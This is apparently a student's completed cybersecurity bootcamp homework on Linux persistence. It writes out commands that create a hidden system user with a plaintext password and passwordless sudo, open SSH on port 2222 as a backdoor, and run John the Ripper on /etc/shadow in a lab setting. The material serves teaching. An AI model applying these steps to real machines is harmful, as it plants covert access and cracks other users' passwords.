## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `Your solution command here`
useradd --no-create-home sysd
2. Give your secret user a password: 
    - `Your solution command here`
passwd sysd
password is H3!!L0
3. Give your secret user a system UID < 1000:
    - `Your solution command here`
usermod -u 568 sysd
4. Give your secret user the same GID:
   - `Your solution command here`
groupmod -g 568 sysd
5. Give your secret user full `sudo` access without the need for a password:
   -  `Your solution command here`
usermod -aG sudo sysd
visudo
sysd ALL=(ALL:ALL) NOPASSWD:ALL


6. Test that `sudo` access works without your password:

    ```bash
su sysd
sudo -l
sudo apt update

# User privilege specification


**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:
sudo nano /etc/ssh/sshd_config
    ```bash
Uncomment Port 22 and Port 2222
    Port 22
    Port 2222
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    systemctl restart ssh

2. Exit the `root` account:
    - `Your solution command here`
exit
3. SSH to the target machine using your `sysd` account and port `2222`:
 ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
sudo su`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `Your solution command here`
ssh sysd@192.168.6.105 -p 2222
2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `Your solution command here`
sudo su
john /etc/shadow
---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

